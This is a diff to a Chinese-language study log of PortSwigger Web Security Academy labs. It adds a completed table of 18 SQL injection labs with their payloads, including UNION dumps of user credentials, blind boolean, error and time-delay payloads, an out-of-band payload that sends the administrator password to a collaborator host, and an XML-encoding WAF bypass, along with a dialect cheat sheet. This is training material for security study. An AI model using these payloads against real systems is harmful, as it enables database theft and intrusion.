@@ -168,6 +168,85 @@ if not token or token != session.get('csrf'): reject()
 
 ---
 
+## SQL 注入 — 已完成 18/18 ✅（2026-09-23 收官）
+
+> 关联笔记：[PortSwigger SQL 注入模块收官 — 盲注四代信道与 XML 编码绕过](./2026-09-23-PortSwigger-SQL注入盲注四信道与WAF编码绕过.md)
+> ⚠️ Lab 1-10 是本模块**早期完成**的（当时未留细节记录），那 10 行按官方标准解法补记；Lab 11-18 是 2026-09-21~23 亲手打通、逐条核过官方解的记录。若我早前的做法与此不同，告一声我改。
+
+| # | Lab | 核心考点 | 攻击手法 |
+|---|-----|---------|---------|
+| 1 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | 数字/字符型注入 · 条件恒真 | 商品分类参数加 `'--`（或 `+OR+1=1--`）→ 原查询条件被注释/恒真 → 连隐藏商品一起返回 |
+| 2 | SQL injection vulnerability allowing login bypass | 认证绕过 | 用户名填 `administrator'--` → 密码校验被注释掉 → 直接以 administrator 登录 |
+| 3 | SQL injection attack, querying the database type and version on Oracle | 定方言 + UNION 回显 | 列数先 `ORDER BY N` 定 → `'+UNION+SELECT+banner,NULL+FROM+v$version--`（Oracle 必须 `from dual`） |
+| 4 | SQL injection attack, querying the database type and version on MySQL and Microsoft | 定方言 | `'+UNION+SELECT+@@version,NULL--` |
+| 5 | SQL injection attack, listing the database contents on non-Oracle databases | 元数据枚举（两步） | `information_schema.tables` → `information_schema.columns` → 拼出真列名脱库 |
+| 6 | SQL injection attack, listing the database contents on Oracle | 元数据枚举（Oracle） | `all_tables` → `all_tab_columns`（表名全大写）→ `'||username||':'||password` 拼接脱库 |
+| 7 | SQL injection UNION attack, determining the number of columns returned by the query | 列数探测 | `'+ORDER+BY+N--` 递增：报错那个 N 的前一个 = 列数（或 `UNION SELECT NULL,NULL…` 数空位） |
+| 8 | SQL injection UNION attack, finding a column containing text | 回显列探测 | 逐列把 `NULL` 换成 `'a'`，页面冒出 a 的那列就是字符串列 |
+| 9 | SQL injection UNION attack, retrieving data from other tables | 跨表脱库 | 定列数 → 定文本列 → `' UNION SELECT username,password FROM users--` |
+| 10 | SQL injection UNION attack, retrieving multiple values in a single column | 单列多值拼接 | 只有一个回显位时拼起来：Oracle/PG/SQLite 用 `'||username||'~'||password`，MySQL 用 `concat()`/`0x3a` |
+| 11 | Blind SQL injection with conditional responses | **盲注①内容信道** | TrackingId cookie 注入；页面 `Welcome back` 的有无 = 查询是否返回行；Intruder **Grep-Match** 加 `Welcome back`，打勾那行即命中，`SUBSTRING` 逐位取密码 |
+| 12 | Blind SQL injection with conditional errors | **盲注②报错信道**（Oracle） | `xyz'||(SELECT CASE WHEN (条件) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` → 真 = **500**、假 = 200；看 Status 列即可判定；`ROWNUM=1` 防子查询多行、`SUBSTR` 逐位 |
+| 13 | Visible error-based SQL injection | 报错**回显**型（非盲） | 页面上直接出现数据库报错 → 把查询结果拼进报错信息里带出来（类型转换报错），最省事的一类 |
+| 14 | Blind SQL injection with time delays | **盲注③延时信道**（PG） | `x'||pg_sleep(10)--` → 响应耗时 10 秒 = 注入成立（无任何回显时的存在性判定） |
+| 15 | Blind SQL injection with time delays and information retrieval | **盲注③延时 + 取数**（PG） | 堆叠语句 `x'%3BSELECT CASE WHEN (条件) THEN pg_sleep(10) ELSE pg_sleep(0) END--`；Intruder **Resource pool 单并发** + 按 `Response received` 列排序，~10000ms 那行命中 |
+| 16 | Blind SQL injection with out-of-band interaction | **盲注④带外信道**（Oracle） | SQLi × XXE：`EXTRACTVALUE(xmltype('…<!ENTITY % remote SYSTEM "http://collab/">…'))` 让 XML 解析器去取外部 DTD → Collaborator 收到 **DNS** 即过关（不需要带数据） |
+| 17 | Blind SQL injection with out-of-band data exfiltration | **盲注④带外 + 带数据** | 把静态域名段换成子查询：`"http://'||(SELECT password FROM users WHERE username='administrator')||'.collab/"` → 密码出现在 Collaborator 记录域名的**最左一段**（右边 32 位是唯一子域） |
+| 18 | SQL injection with filter bypass via XML encoding | **WAF 绕过**（编码层差） | `POST /product/stock` 的 XML body 注入点；WAF 拦 SQL 关键词 → Hackvertor `hex_entities` 把 payload 编成 XML 实体（WAF 看编码后、数据库看解码后）→ `1 UNION SELECT username \|\| '~' \|\| password FROM users`（该查询只有 1 列，2 列会返回 `0 units`） |
+
+### SQL 注入知识点总结（我的版本 · 决策向）
+
+**① 盲注 = 换信道，不换骨架**（骨架四代通用：**存在性 → 长度 → 逐位**）
+
+| 代 | 信道 | 判定信号 | 什么时候逼我用它 |
+|---|---|---|---|
+| 1 | 内容 | 页面多/少一行字（`Welcome back`） | 查询结果能影响正常渲染 |
+| 2 | 报错 | HTTP 500 / 自定义错误页 | 应用把数据库报错暴露出来 |
+| 3 | 延时 | 响应耗时（10s vs 0s） | 无回显、无报错，但查询**同步**执行 |
+| 4 | 带外 OOB | Collaborator 收到 DNS/HTTP | 连延时都不可靠（查询**异步**、不阻塞响应） |
+
+动手前先做「真假对照」自证信道：`' AND '1'='1` / `' AND '1'='2`（内容）· `1=1`/`1=2`（报错）· 10s/0s（延时）· 有/无记录（OOB）。**判定信号全哑时先怀疑自己的 payload。**
+
+**② payload 怎么接进原语句 —— 四种接法（选法 = 类型 + 位置 + 有没有回显）**
+
+| 接法 | 语法身份 | 前提 | 失效特征 → 自救 |
+|---|---|---|---|
+| `AND` / `OR` | WHERE 里的布尔连接词 | 表达式必须返回 **boolean** | PG `pg_sleep()` 返回 void → `argument of AND must be type boolean, not type void`，**解析期就死**（不是被拦）→ 换堆叠或包一层子查询 |
+| `UNION` | 结果集拼接 | 列数/类型对齐 + **结果会被显示** | 盲注天然不适用（不回显）；`void` 也不能当列 |
+| `\|\|` 拼接 | 原表达式里的字符串拼接 | 只能注入表达式 + **自己配平首尾引号** | 忘写尾部 `\|\|'` → 语法错（原语句的收尾引号没人配对） |
+| `;` **堆叠** | 另起一条完整语句 | 数据库 **+ 驱动**都允许多语句 | 报错/无延时 = 驱动不允许多语句（MySQL `mysqli_query` 单语句 / PDO 预处理）→ 退回拼接路线 |
+| `-- ` 注释 | 吃掉原语句剩余部分 | 注释符后必须有空格（URL 里 `--+` / `--%20`） | Oracle/SQLite 只认 `-- ` 和 `/**/`，**不认 `#`** |
+
+**③ 方言矩阵（盲注最常撞的几行）**
+
+| | MySQL | SQLite | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|---|---|
+| 无表查询 | ✅ `select 1` | ✅ | ✅ | ❌ **必须 `from dual`** | ✅ |
+| 拼接 | `concat()` / `0x3a` | `\|\|` / `char(58)` | `\|\|` | `\|\|` / `chr(58)` | `+` |
+| 截子串 | `SUBSTRING` | `substr` | `SUBSTRING`/`SUBSTR` | **`SUBSTR`**（不认 SUBSTRING） | `SUBSTRING` |
+| 注释 | `#` `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` |
+| 限行 | `LIMIT` | `LIMIT` | `LIMIT` | **`ROWNUM`** | `TOP` |
+| 延时原语 | `sleep(5)` | ❌ 没有 | `pg_sleep(5)` | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:5'` |
+| 报错原语 | `updatexml()` | 基本没有 | `1/0` 类型错 | **`TO_CHAR(1/0)`** → ORA-01476 | `convert(int,…)` |
+| 表名列名大小写 | 看建表 | 不敏感 | 小写 | 未加引号建的 → **全大写** | 不敏感 |
+
+铁律：**报错原文 > 行为差异 > 栈指纹**；「`database()` 报 no such function」不是注入失败，是方言暴露。
+
+**④ 编码层数 = 解码层数（WAF/过滤器绕过通用心法）**
+数据经过几个解析器就有几层编码可做。WAF 只做字符串匹配、站在第一个解码器**前面** ⇒ **过滤发生在解码之前，利用发生在解码之后**。正反两个实例：`%253f`（编多了 → 服务端解一层得到字面 `%3f` → XML 非法、收不到回连）；Hackvertor `hex_entities`（**故意多编一层** → 过 WAF）。
+
+**⑤ 判定信号在哪儿读（省得再查）**
+
+| 信道 | 读取位置 |
+|---|---|
+| 内容 | Intruder → Settings → **Grep - Match** 加关键词，打勾那行命中 |
+| 报错 | Intruder 结果表 **Status 列**（500 = 真） |
+| 延时 | Intruder **`Response received` 列**（~10000ms = 真）；⚠️ Resource pool 设 **Maximum concurrent requests = 1** |
+| 带外 | Collaborator **Poll now** → DNS 的 **Description** / HTTP 的 **Host 头**；数据在域名**最左一段**，右侧 32 位是唯一子域（信箱号） |
+
+
+---
+
 ## 知识点总结
 
 ### 越权的四种模式
@@ -316,8 +395,9 @@ username=carlos&password=xxx
 
 ## 下一阶段
 
-- **文件上传模块进行中（2/7，Lab 1-2 待确认）**：下一关 = Lab 5 Web shell upload via obfuscated file extension（混淆扩展名，玩**空字节截断**），然后 Lab 6 polyglot 图片马、Lab 7 race condition
-- **SSRF 模块进行中（5/7）**：剩 2 关 = 第 6 关 Blind SSRF with Shellshock（盲打 + `User-Agent` 注入 Shellshock → RCE）、第 7 关 SSRF with whitelist-based input filter（EXPERT，白名单绕过 `@`/`#`/`?` 解析差异）
+- **SQL 注入模块 已通关（18/18，2026-09-23 收官）**：盲注四代信道 + WAF 编码绕过见 [2026-09-23 笔记](./2026-09-23-PortSwigger-SQL注入盲注四信道与WAF编码绕过.md)
+- **文件上传模块进行中（4/7）**：下一关 = Lab 5 Web shell upload via obfuscated file extension（混淆扩展名，玩**空字节截断**），然后 Lab 6 polyglot 图片马、Lab 7 race condition
+- **SSRF 模块进行中（5/7）**：剩 2 关 = 第 6 关 Blind SSRF with Shellshock （盲打 + `User-Agent` 注入 Shellshock → RCE）、第 7 关 SSRF with whitelist-based input filter（EXPERT，白名单绕过 `@`/`#`/`?` 解析差异）
 - **CSRF 暂停（4/11）**：下一关 = CSRF where token is tied to non-session cookie；另待补第 3 关的对照实验（POST + 删 csrf 是否通过）
 - **XSS 模块进行中（7/30）**：下一道 = Stored XSS into anchor href attribute with double quotes HTML-encoded（#8，payload 用 `javascript:`）
 - **Authentication 收尾**：剩 1 道 —— 2FA bypass using a brute-force attack（Lab 14，EXPERT，关键 = Burp Macro + Session handling rule）
